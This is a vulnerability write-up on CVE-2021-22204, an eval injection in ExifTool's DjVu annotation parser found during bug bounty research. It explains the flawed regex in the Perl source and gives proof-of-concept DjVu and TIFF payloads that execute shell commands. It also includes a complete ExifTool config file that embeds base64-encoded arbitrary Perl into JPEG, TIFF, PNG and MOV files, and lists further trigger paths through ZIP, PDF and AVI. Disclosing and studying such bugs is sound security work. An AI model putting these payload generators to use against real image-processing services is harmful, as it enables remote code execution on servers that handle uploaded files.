@@ -1,0 +1,545 @@
+## Background
+
+While looking at one of my favourite bug bounty programs, I noticed they were using ExifTool to strip tags from uploaded images. I’d used ExifTool numerous times in the past but didn’t even know what language it was written in. An older version was being used (11.70), so I thought maybe there could be some existing CVEs that could be abused, as parsing file formats is hard.
+
+A quick search showed only one old CVE from 2018, so decided to look at the source instead. It turns out that it is written in Perl! I’ve never really used or reviewed Perl code before, but being a dynamic scripting language the majority of the general concepts were familiar.
+
+I started looking for places that performed file access but without much success. I then looked for places that called `eval`, and it turned out that it was used a lot: 
+
+In Perl, `eval` can be used with a block to trap exceptions which is why it was being used everywhere. Ignoring all the eval blocks, there were still a fair few interesting results. One of these was located in the `ParseAnt` method of the DjVu module:
+    
+    
+    #------------------------------------------------------------------------------
+    # Parse DjVu annotation "s-expression" syntax (recursively)
+    # Inputs: 0) data ref (with pos($$dataPt) set to start of annotation)
+    # Returns: reference to list of tokens/references, or undef if no tokens,
+    #          and the position in $$dataPt is set to end of last token
+    # Notes: The DjVu annotation syntax is not well documented, so I make
+    #        a number of assumptions here!
+    sub ParseAnt($)
+    {
+        my $dataPt = shift;
+        my (@toks, $tok, $more);
+        # (the DjVu annotation syntax really sucks, and requires that every
+        # single token be parsed in order to properly scan through the items)
+    Tok: for (;;) {
+            # find the next token
+            last unless $$dataPt =~ /(\S)/sg;   # get next non-space character
+            if ($1 eq '(') {       # start of list
+                $tok = ParseAnt($dataPt);
+            } elsif ($1 eq ')') {  # end of list
+                $more = 1;
+                last;
+            } elsif ($1 eq '"') {  # quoted string
+                $tok = '';
+                for (;;) {
+                    # get string up to the next quotation mark
+                    # this doesn't work in perl 5.6.2! grrrr
+                    # last Tok unless $$dataPt =~ /(.*?)"/sg;
+                    # $tok .= $1;
+                    my $pos = pos($$dataPt);
+                    last Tok unless $$dataPt =~ /"/sg;
+                    $tok .= substr($$dataPt, $pos, pos($$dataPt)-1-$pos);
+                    # we're good unless quote was escaped by odd number of backslashes
+                    last unless $tok =~ /(\\+)$/ and length($1) & 0x01;
+                    $tok .= '"';    # quote is part of the string
+                }
+                # must protect unescaped "$" and "@" symbols, and "\" at end of string
+                $tok =~ s{\\(.)|([\$\@]|\\$)}{'\\'.($2 || $1)}sge;
+                # convert C escape sequences (allowed in quoted text)
+                $tok = eval qq{"$tok"};
+            } else {                # key name
+                pos($$dataPt) = pos($$dataPt) - 1;
+                # allow anything in key but whitespace, braces and double quotes
+                # (this is one of those assumptions I mentioned)
+                $tok = $$dataPt =~ /([^\s()"]+)/sg ? $1 : undef;
+            }
+            push @toks, $tok if defined $tok;
+        }
+        # prevent further parsing unless more after this
+        pos($$dataPt) = length $$dataPt unless $more;
+        return @toks ? \@toks : undef;
+    }
+    
+
+I had no idea what a `DjVu` file was, but the `ParseAnt` method was fairly well commented. The block that contained the eval was when the current match was a quote:
+    
+    
+      $tok = '';
+      for (;;) {
+          # get string up to the next quotation mark
+          # this doesn't work in perl 5.6.2! grrrr
+          # last Tok unless $$dataPt =~ /(.*?)"/sg;
+          # $tok .= $1;
+          my $pos = pos($$dataPt);
+          last Tok unless $$dataPt =~ /"/sg;
+          $tok .= substr($$dataPt, $pos, pos($$dataPt)-1-$pos);
+          # we're good unless quote was escaped by odd number of backslashes
+          last unless $tok =~ /(\\+)$/ and length($1) & 0x01;
+          $tok .= '"';    # quote is part of the string
+      }
+      # must protect unescaped "$" and "@" symbols, and "\" at end of string
+      $tok =~ s{\\(.)|([\$\@]|\\$)}{'\\'.($2 || $1)}sge;
+      # convert C escape sequences (allowed in quoted text)
+      $tok = eval qq{"$tok"};
+    
+
+It would build up a string until another quote was found, taking into account quotes escaped with a backslash. There was then some regex to escape special characters before passing it quoted to qq and then finally passing the result to `eval`. From the comments, this was done to support C escape sequences, which I guess are similar in Perl. The special characters being escaped were trying to prevent any string interpolation or breaking out of the double quotes when the eval was run.
+
+To try out a few things, I wanted to be able to hit the `ParseAnt` from an image. Luckily there was an example DjVu.djvu image, but unfortunately, it was using the compressed version of the chunk `ANTz` instead of the text `ANTa`.
+
+Looking at the file in a hex editor, the format seemed fairly simple. There was the string `DJVIANTz` followed by the hex `000002E0`. Since that corresponded to the remaining number of bytes in the file, it was most likely the length of the tag. I added a `print($$dataPt);` to the `ProcessAnt` method and ran exiftool on the djvu image and the following was printed out:
+    
+    
+    (metadata
+            (Author "Phil Harvey")
+            (Title "DjVu Metadata Sample")
+            (Subject "ExifTool DjVu test image")
+            (Creator "ExifTool")
+            (CreationDate "2008-09-23T12:31:34-04:00")
+            (ModDate "2008-11-11T09:17:10-05:00")
+            (Keywords "ExifTool, Test, DjVu, XMP")
+            (Producer "djvused")
+            (note "Must escape double quotes (\") and backslashes (\\)")
+            (Trapped "Unknown")
+            (annote "Did you get this?")
+            (url "https://exiftool.org/") )
+    (xmp "<rdf:RDF xmlns:rdf='http://www.w3.org/1999/02/22-rdf-syntax-ns#'>\n\n <rdf:Description rdf:about=''\n  xmlns:album=\"http://ns.adobe.com/album/1.0/\">\n  <album:Notes>Must escape double quotes (&quot;) and backslashes (\\)</album:Notes>\n </rdf:Description>\n\n <rdf:Description rdf:about=''\n  xmlns:dc='http://purl.org/dc/elements/1.1/'>\n  <dc:creator>\n   <rdf:Seq>\n    <rdf:li>Phil Harvey</rdf:li>\n   </rdf:Seq>\n  </dc:creator>\n  <dc:description>\n   <rdf:Alt>\n    <rdf:li xml:lang='x-default'>ExifTool DjVu test image</rdf:li>\n   </rdf:Alt>\n  </dc:description>\n  <dc:rights>\n   <rdf:Alt>\n    <rdf:li xml:lang='x-default'>Copyright 2008 Phil Harvey</rdf:li>\n   </rdf:Alt>\n  </dc:rights>\n  <dc:subject>\n   <rdf:Bag>\n    <rdf:li>ExifTool</rdf:li>\n    <rdf:li>Test</rdf:li>\n    <rdf:li>DjVu</rdf:li>\n    <rdf:li>XMP</rdf:li>\n   </rdf:Bag>\n  </dc:subject>\n  <dc:title>\n   <rdf:Alt>\n    <rdf:li xml:lang='x-default'>DjVu Metadata Sample</rdf:li>\n   </rdf:Alt>\n  </dc:title>\n </rdf:Description>\n\n <rdf:Description rdf:about=''\n  xmlns:pdf='http://ns.adobe.com/pdf/1.3/'>\n  <pdf:Keywords>ExifTool, Test, DjVu, XMP</pdf:Keywords>\n  <pdf:Producer>djvused</pdf:Producer>\n  <pdf:Trapped>/Unknown</pdf:Trapped>\n </rdf:Description>\n\n <rdf:Description rdf:about=''\n  xmlns:xmp='http://ns.adobe.com/xap/1.0/'>\n  <xmp:CreateDate>2008-09-23T12:31:34-04:00</xmp:CreateDate>\n  <xmp:CreatorTool>ExifTool</xmp:CreatorTool>\n  <xmp:ModifyDate>2008-11-11T09:17:10-05:00</xmp:ModifyDate>\n </rdf:Description>\n</rdf:RDF>")
+    
+    <snip>
+    
+    Author                          : Phil Harvey
+    Create Date                     : 2008:09:23 12:31:34-04:00
+    Modify Date                     : 2008:11:11 09:17:10-05:00
+    Keywords                        : ExifTool, Test, DjVu, XMP
+    
+
+So the metadata format seems to be bracket indented starting with `metadata` and followed by tag name and quoted value pairs. I edited the file replacing the `DJVIANTz...` block with `DJVIANTa\x00\x00\x00!(metadata (Author "Phil Harvey"))`, re-ran exiftool, and the author tag was extracted and displayed!
+
+## The Bug
+
+Now I had a way that I could quickly test different combinations, which I combined by adding more `print` lines to display each time the `$tok` was modified. I was testing different combinations of new lines and backslashes when the following error was shown:
+    
+    
+    String found where operator expected at (eval 8) line 2, at end of line
+            (Missing semicolon on previous line?)
+    
+
+I had used a backslash followed by a newline then a double quote which hard resulted in the following being evaled:
+    
+    
+    "a\
+    ""
+    
+
+The second quote was not escaped because in the regex `$tok =~ /(\\+)$/` the `$` will match the end of a string, but also match before a newline at the end of a string, so the code thinks that the quote is being escaped when it’s escaping the newline.
+
+This was pretty exciting as all that was needed was to make it valid Perl and it would be evaled! I change the metadata to comment out the trailing quote and execute and return `date`:
+    
+    
+    (metadata
+        (Author "\
+    " . return `date`; #")
+    )
+    
+
+Running exiftool on the new image resulting in code execution!
+    
+    
+    ExifTool Version Number         : 12.23
+    File Name                       : DjVu.djvu
+    File Size                       : 376 bytes
+    File Modification Date/Time     : 2021:05:04 22:50:09+10:00
+    File Access Date/Time           : 2021:05:04 22:50:09+10:00
+    File Inode Change Date/Time     : 2021:05:04 22:50:09+10:00
+    File Permissions                : -rw-r--r--
+    File Type                       : DJVU (multi-page)
+    File Type Extension             : djvu
+    MIME Type                       : image/vnd.djvu
+    Subfile Type                    : Single-page image
+    Image Width                     : 8
+    Image Height                    : 8
+    DjVu Version                    : 0.24
+    Spatial Resolution              : 100
+    Gamma                           : 2.2
+    Orientation                     : Unknown (0)
+    Included File ID                : shared_anno.iff
+    Author                          : Tue  4 May 2021 22:51:12 AEST.
+    Image Size                      : 8x8
+    Megapixels                      : 0.000064
+    
+
+## Additional Formats
+
+Having code execution by just passing an unknown file to ExifTool was pretty amazing, but what would be even better was if the bug could be trigged with a valid image in a more common format. That way even if some validation was performed on the image before being passed to ExifTool (for example ensuring that it’s a png or jpeg) then it would still work.
+
+I started looking to see if anything else used the `DjVu` module, but it was only referenced by the `AIFF` module and no other formats referenced that one. I remembered that ExifTool could be used to embed and extract jpeg thumbnails, but looking where `ThumbnailImage` was used it didn’t seem to try and parse the embedded image.
+
+That lead me to look for functions that did parse the image metadata:
+    
+    
+    #------------------------------------------------------------------------------
+    # Extract meta information from image
+    # Inputs: 0) ExifTool object reference
+    #         1-N) Same as ImageInfo()
+    # Returns: 1 if this was a valid image, 0 otherwise
+    # Notes: pass an undefined value to avoid parsing arguments
+    # Internal 'ReEntry' option allows this routine to be called recursively
+    sub ExtractInfo($;@)
+    
+
+Interestingly the comment mentioned that this could be called recursively if the `ReEntry` option was specified. Looking at where `ExtractInfo` was being used lead me to the Exif module:
+    
+    
+    %Image::ExifTool::Exif::Main = (
+      # SNIP
+    
+      0xc51b => { # (Hasselblad H3D)
+            Name => 'HasselbladExif',
+            Format => 'undef',
+            RawConv => q{
+                $$self{DOC_NUM} = ++$$self{DOC_COUNT};
+                $self->ExtractInfo(\$val, { ReEntry => 1 });
+                $$self{DOC_NUM} = 0;
+                return undef;
+            },
+        },
+    
+
+So if the EXIF tag `0xc51b` was found, the value would be passed to `ExtractInfo` and the metadata would be parsed, allowing the DjVu bug to be hit! The description at the top of the Exif module was `Read EXIF/TIFF meta information`, so I started reading about the TIFF format.
+
+There was a sample tif in the test files, and running exiftools with `-v10` was very helpful:
+    
+    
+    exiftool -v10 ./t/images/ExifTool.tif
+      ExifToolVersion = 11.85
+      FileName = ExifTool.tif
+      Directory = ./t/images
+      FileSize = 4864
+      FileModifyDate = 1618544560
+      FileAccessDate = 1618544564
+      FileInodeChangeDate = 1618974185
+      FilePermissions = 33188
+      FileType = TIFF
+      FileTypeExtension = TIF
+      MIMEType = image/tiff
+      ExifByteOrder = MM
+      + [IFD0 directory with 22 entries]
+      | 0)  SubfileType = 0
+      |     - Tag 0x00fe (4 bytes, int32u[1]):
+      |         0012: 00 00 00 00                                     [....]
+      | 1)  ImageWidth = 160
+      |     - Tag 0x0100 (4 bytes, int32u[1]):
+      |         001e: 00 00 00 a0                                     [....]
+      | 2)  ImageHeight = 120
+      |     - Tag 0x0101 (4 bytes, int32u[1]):
+      |         002a: 00 00 00 78                                     [...x]
+      | 3)  BitsPerSample = 8 8 8
+      |     - Tag 0x0102 (6 bytes, int16u[3]):
+      |         0116: 00 08 00 08 00 08                               [......]
+      | 4)  Compression = 5
+      |     - Tag 0x0103 (2 bytes, int16u[1]):
+      |         0042: 00 05                                           [..]
+      | 5)  PhotometricInterpretation = 2
+      |     - Tag 0x0106 (2 bytes, int16u[1]):
+      |         004e: 00 02                                           [..]
+      | 6)  ImageDescription = The picture caption
+      |     - Tag 0x010e (20 bytes, string[20]):
+      |         011c: 54 68 65 20 70 69 63 74 75 72 65 20 63 61 70 74 [The picture capt]
+      |         012c: 69 6f 6e 00                                     [ion.]
+      | 7)  Make = Canon
+      |     - Tag 0x010f (6 bytes, string[6]):
+      |         0130: 43 61 6e 6f 6e 00                               [Canon.]
+      | 8)  Model = Canon EOS DIGITAL REBEL
+      |     - Tag 0x0110 (24 bytes, string[24]):
+      |         0136: 43 61 6e 6f 6e 20 45 4f 53 20 44 49 47 49 54 41 [Canon EOS DIGITA]
+      |         0146: 4c 20 52 45 42 45 4c 00                         [L REBEL.]
+      | 9)  StripOffsets = 3816
+      |     - Tag 0x0111 (4 bytes, int32u[1]):
+      |         007e: 00 00 0e e8                                     [....]
+      | 10) SamplesPerPixel = 3
+      |     - Tag 0x0115 (2 bytes, int16u[1]):
+      |         008a: 00 03                                           [..]
+      | 11) RowsPerStrip = 120
+      |     - Tag 0x0116 (4 bytes, int32u[1]):
+      |         0096: 00 00 00 78                                     [...x]
+      | 12) StripByteCounts = 1048
+      |     - Tag 0x0117 (4 bytes, int32u[1]):
+      |         00a2: 00 00 04 18                                     [....]
+      | 13) XResolution = 180 (1800/10)
+      |     - Tag 0x011a (8 bytes, rational64u[1]):
+      |         014e: 00 00 07 08 00 00 00 0a                         [........]
+      | 14) YResolution = 180 (1800/10)
+      |     - Tag 0x011b (8 bytes, rational64u[1]):
+      |         0156: 00 00 07 08 00 00 00 0a                         [........]
+      | 15) PlanarConfiguration = 1
+      |     - Tag 0x011c (2 bytes, int16u[1]):
+      |         00c6: 00 01                                           [..]
+      | 16) ResolutionUnit = 2
+      |     - Tag 0x0128 (2 bytes, int16u[1]):
+      |         00d2: 00 02                                           [..]
+      | 17) Software = GraphicConverter
+      |     - Tag 0x0131 (17 bytes, string[17]):
+      |         015e: 47 72 61 70 68 69 63 43 6f 6e 76 65 72 74 65 72 [GraphicConverter]
+      |         016e: 00                                              [.]
+      | 18) ModifyDate = 2004:02:20 08:07:49
+      |     - Tag 0x0132 (20 bytes, string[20]):
+      |         0170: 32 30 30 34 3a 30 32 3a 32 30 20 30 38 3a 30 37 [2004:02:20 08:07]
+      |         0180: 3a 34 39 00                                     [:49.]
+      | 19) Predictor = 1
+      |     - Tag 0x013d (2 bytes, int16u[1]):
+      |         00f6: 00 01                                           [..]
+      | 20) IPTC-NAA (SubDirectory) -->
+      |     - Tag 0x83bb (284 bytes, int32u[71] read as undef[284]):
+      |         0184: 1c 02 00 00 02 00 02 1c 02 78 00 13 54 68 65 20 [.........x..The ]
+      |         0194: 70 69 63 74 75 72 65 20 63 61 70 74 69 6f 6e 1c [picture caption.]
+      |         01a4: 02 7a 00 0a 49 20 77 72 6f 74 65 20 69 74 1c 02 [.z..I wrote it..]
+      |         01b4: 28 00 0f 6e 6f 20 69 6e 73 74 72 75 63 74 69 6f [(..no instructio]
+      |         01c4: 6e 73 1c 02 50 00 0e 49 27 6d 20 74 68 65 20 61 [ns..P..I'm the a]
+      |         01d4: 75 74 68 6f 72 1c 02 55 00 06 4f 6e 20 74 6f 70 [uthor..U..On top]
+      |         01e4: 1c 02 6e 00 0b 50 68 69 6c 20 48 61 72 76 65 79 [..n..Phil Harvey]
+      |         01f4: 1c 02 73 00 09 4d 79 20 63 61 6d 65 72 61 1c 02 [..s..My camera..]
+      |         0204: 05 00 11 54 68 69 73 20 69 73 20 74 68 65 20 74 [...This is the t]
+      |         0214: 69 74 6c 65 1c 02 37 00 08 32 30 30 34 30 32 32 [itle..7..2004022]
+      |         0224: 30 1c 02 5a 00 08 4b 69 6e 67 73 74 6f 6e 1c 02 [0..Z..Kingston..]
+      |         0234: 5f 00 07 4f 6e 74 61 72 69 6f 1c 02 65 00 06 43 [_..Ontario..e..C]
+      |         0244: 61 6e 61 64 61 1c 02 67 00 0c 6e 6f 20 72 65 66 [anada..g..no ref]
+      |         0254: 65 72 65 6e 63 65 1c 02 19 00 08 65 78 69 66 74 [erence.....exift]
+      |         0264: 6f 6f 6c 1c 02 19 00 04 74 65 73 74 1c 02 19 00 [ool.....test....]
+      |         0274: 07 70 69 63 74 75 72 65 1c 02 74 00 10 43 6f 70 [.picture..t..Cop]
+      |         0284: 79 72 69 67 68 74 20 6e 6f 74 69 63 65 1c 02 69 [yright notice..i]
+      |         0294: 00 08 68 65 61 64 6c 69 6e 65 00 00             [..headline..]
+      | + [IPTC directory, 284 bytes]
+      ...
+    
+
+Opening the file in a hex editor and searching for the tag id `83BB` found the following sequence `83BB00040000004700000184`. Referring to format doc this should match up with the tif tag:
+    
+    
+    typedef struct _TifTag
+    {
+    	WORD   TagId;       /* The tag identifier  */
+    	WORD   DataType;    /* The scalar type of the data items  */
+    	DWORD  DataCount;   /* The number of items in the tag data  */
+    	DWORD  DataOffset;  /* The byte offset to the data items  */
+    } TIFTAG;
+    
+
+So the tag id is 0x83BB, the datatype is 4, the count is 0x47 (71) and the offset 0x184 (388). The data type of 4 is a `32-bit unsigned integer`, which all fits with the information provided by the verbose output. Simply changing `0x83BB` to `0xC51B` and rerunning exiftool had it picking up the `HasselbladExif` tag! I then replaced the whole tag value with a short payload that would trigger the eval:
+    
+    
+    $ exiftool -v10 ./t/images/ExifTool.tif
+    ...
+      | 19) Predictor = 1
+      |     - Tag 0x013d (2 bytes, int16u[1]):
+      |         00f6: 00 01                                           [..]
+      | 20) HasselbladExif = AT&TFORM.DJVUANTa..(metadata.    (Author "\." . return `date`; #")
+      |     - Tag 0xc51b (284 bytes, int32u[71] read as undef[284]):
+      |         0184: 41 54 26 54 46 4f 52 4d 00 00 00 08 44 4a 56 55 [AT&TFORM....DJVU]
+      |         0194: 41 4e 54 61 00 00 01 04 28 6d 65 74 61 64 61 74 [ANTa....(metadat]
+      |         01a4: 61 0a 20 20 20 20 28 41 75 74 68 6f 72 20 22 5c [a.    (Author "\]
+      |         01b4: 0a 22 20 2e 20 72 65 74 75 72 6e 20 60 64 61 74 [." . return `dat]
+      |         01c4: 65 60 3b 20 23 22 29 20 20 20 20 20 20 20 20 20 [e`; #")         ]
+      |         01d4: 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 [                ]
+      |         01e4: 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 [                ]
+      |         01f4: 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 [                ]
+      |         0204: 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 [                ]
+      |         0214: 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 [                ]
+      |         0224: 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 [                ]
+      |         0234: 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 [                ]
+      |         0244: 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 [                ]
+      |         0254: 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 [                ]
+      |         0264: 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 [                ]
+      |         0274: 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 [                ]
+      |         0284: 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 [                ]
+      |         0294: 20 20 20 20 20 20 20 20 20 20 20 20             [            ]
+      | FileType = DJVU
+      | FileTypeExtension = DJVU
+      | MIMEType = image/vnd.djvu
+    AIFF 'ANTa' chunk (260 bytes of data): 24
+      | ANTa (SubDirectory) -->
+      | - Tag 'ANTa' (260 bytes):
+      |     0018: 28 6d 65 74 61 64 61 74 61 0a 20 20 20 20 28 41 [(metadata.    (A]
+      |     0028: 75 74 68 6f 72 20 22 5c 0a 22 20 2e 20 72 65 74 [uthor "\." . ret]
+      |     0038: 75 72 6e 20 60 64 61 74 65 60 3b 20 23 22 29 20 [urn `date`; #") ]
+      |     0048: 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 [                ]
+      |     0058: 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 [                ]
+      |     0068: 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 [                ]
+      |     0078: 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 [                ]
+      |     0088: 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 [                ]
+      |     0098: 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 [                ]
+      |     00a8: 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 [                ]
+      |     00b8: 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 [                ]
+      |     00c8: 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 [                ]
+      |     00d8: 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 [                ]
+      |     00e8: 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 [                ]
+      |     00f8: 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 [                ]
+      |     0108: 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 [                ]
+      |     0118: 20 20 20 20                                     [    ]
+      | | Metadata (SubDirectory) -->
+      | | + [Metadata directory with 1 entries]
+      | | | Author = Thu  6 May 2021 21:06:17 AEST.
+    
+
+Great so now the payload could be triggered from a valid tif! What’s more, the EXIF data is used in quite a few other formats:
+    
+    
+    EXIF stands for "Exchangeable Image File Format".  This type of information
+    is formatted according to the TIFF specification, and may be found in JPG,
+    TIFF, PNG, JP2, PGF, MIFF, HDP, PSP and XCF images, as well as many
+    TIFF-based RAW images, and even some AVI and MOV videos.
+    
+
+Instead of manually editing the files each time, it would be great if there was a tool designed to edit image metadata. It turns out ExifTool allows you to create your own tag tables with a config file using `Image::ExifTool::UserDefined`. After a bit of trial and error I had the following `eval.config` file:
+    
+    
+    %Image::ExifTool::UserDefined = (
+        'Image::ExifTool::Exif::Main' => {
+            0xc51b => {
+                Name => 'eval',
+                Binary => 1,
+                Writable => 'undef',
+                WriteGroup => 'IFD0',
+                ValueConvInv => sub {
+                    use MIME::Base64;
+                    my $val = shift;
+                    $encoded = encode_base64($val);
+                    my $meta = qq/(metadata(Copyright "\\\n" eq ''; return (eval { use MIME::Base64; eval(decode_base64(q%$encoded%)); });#"))/;
+                    my $len = pack "N", length($meta);
+                    my $payload = qq/AT&TFORM\x00\x00\x00\x08DJVUANTa$len$meta/;
+                    return $payload;
+                }
+            }
+        }
+    )
+    
+
+This let you add the `HasselbladExif` tag to any format that exiftool could write EXIF tags to (eg jpg, tif, png):
+    
+    
+    $ exiftool -config eval.config image.jpg -eval='system("echo ggg")'
+    $ exiftool image.jpg
+    $ exiftool image.jpg
+    ggg
+    ExifTool Version Number         : 11.85
+    File Name                       : image.jpg
+    Directory                       : .
+    File Size                       : 11 kB
+    
+
+## Bonus Formats
+
+Any of the formats that use the tag table `Image::ExifTool::Exif::Main`, call `ExtractInfo`, `ProcessTIFF`, `ProcessExif`, or process any of the vulnerable formates can most likely be used as well. An incomplete list:
+
+  * ZIP - lib/Image/ExifTool/ZIP.pm#L599-L600
+
+If a zip file contains `meta.json` then it will have `ExtractInfo` called on it.
+    
+    
+    if ($extract{$file}) {
+        ($buff, $status) = $zip->contents($member);
+        $status and $et->Warn("Error extracting $file"), next;
+        if ($file eq 'meta.json') {
+            $et->ExtractInfo(\$buff, { ReEntry => 1 });
+            if ($$et{VALUE}{App} and $$et{VALUE}{App} =~ /sketch/i) {
+                $et->OverrideFileType('SKETCH');
+            }
+    
+
+  * PDF - lib/Image/ExifTool/PDF.pm#L2071-L2076
+
+If a PDF uses the `DCTDecode` or `JPXDecode` filters then `ExtractInfo` will be called on it.
+    
+    
+    if ($filter eq '/DCTDecode' or $filter eq '/JPXDecode') {
+        DecodeStream($et, $dict) or last;
+        # save the image itself
+        $et->FoundTag($tagInfo, \$$dict{_stream});
+        # extract information from embedded image
+        $result = $et->ExtractInfo(\$$dict{_stream}, { ReEntry => 1 });
+    
+
+  * AVI - lib/Image/ExifTool/RIFF.pm#L497-L503
+
+The `EXIF` tag will be processed as a tiff. ExifTool doesn’t support writing to AVIs, but one of the `JUNK` tags used for alignment in the AVI could just be replaced with `EXIF` and a tiff/exif payload.
+    
+    
+        EXIF => [{ # (WebP)
+            Name => 'EXIF',
+            Condition => '$$valPt =~ /^(II\x2a\0|MM\0\x2a)/',
+            Notes => 'WebP files',
+            SubDirectory => {
+                TagTable => 'Image::ExifTool::Exif::Main',
+                ProcessProc => \&Image::ExifTool::ProcessTIFF,
+    
+
+  * MOV/MP4 - lib/Image/ExifTool/QuickTime.pm#L2128-L2132
+
+The `UserData` tag `RMKN` will be processed as a tiff which will then its exif data parsed.
+    
+    
+        RMKN => { #PH (GR)
+            Name => 'RicohRMKN',
+            SubDirectory => {
+                TagTable => 'Image::ExifTool::Exif::Main',
+                ProcessProc => \&Image::ExifTool::ProcessTIFF, # (because ProcessMOV is default)
+    
+
+The config file from before can be modified to add support for writing to this tag:
+    
+    
+    use MIME::Base64;
+    
+    sub GetDjVu {
+        my ($val) = @_;
+        $encoded = encode_base64($val);
+        my $meta = qq/(metadata(Copyright "\\\n" eq ''; return (eval { use MIME::Base64; eval(decode_base64(q%$encoded%)); });#"))/;
+        my $len = pack "N", length($meta);
+        my $payload = qq/AT&TFORM\x00\x00\x00\x08DJVUANTa$len$meta/;
+        return $payload;
+    }
+    
+    sub GetTiff {
+        my ($val) = @_;
+        my $payload = GetDjVu($val);
+        my $len = pack "N", length($payload) + 1;
+        my $tif =
+            "MM\x00*\x00\x00\x00\x08\x00\x05\x01\x1a\x00\x05\x00\x00\x00\x01\x00\x00\x00J\x01\x1b\x00\x05\x00\x00\x00\x01\x00" .
+            "\x00\x00R\x01(\x00\x03\x00\x00\x00\x01\x00\x03\x00\x00\x02\x13\x00\x03\x00\x00\x00\x01\x00\x01\x00\x00\xc5\x1b\x00\x07" .
+            "$len\x00\x00\x00Z\x00\x00\x00\x00\x00\x00\x00%\x00\x00\x00\x01\x00\x00\x00%\x00\x00\x00\x01" .
+            "$payload\x00";
+        return $tif;
+    }
+    
+    %Image::ExifTool::UserDefined = (
+        'Image::ExifTool::Exif::Main' => {
+            0xc51b => {
+                Name => 'eval',
+                Binary => 1,
+                Writable => 'undef',
+                WriteGroup => 'IFD0',
+                ValueConvInv => sub {
+                    return GetDjVu(shift);
+                }
+            }
+        },
+    
+        'Image::ExifTool::QuickTime::UserData' => {
+            'RMKN' => {
+                Name => 'eval',
+                Binary => 1,
+                Writable => 'undef',
+                ValueConvInv => sub {
+                    return GetTiff(shift);
+                }
+            }
+        }
+    )
+    
+
+## References
+
+  * https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-22204
+  * https://hackerone.com/reports/1154542
+  * @wcbowling/status/138580392732141568
+  * https://exiftool.org/history.html#v12.24
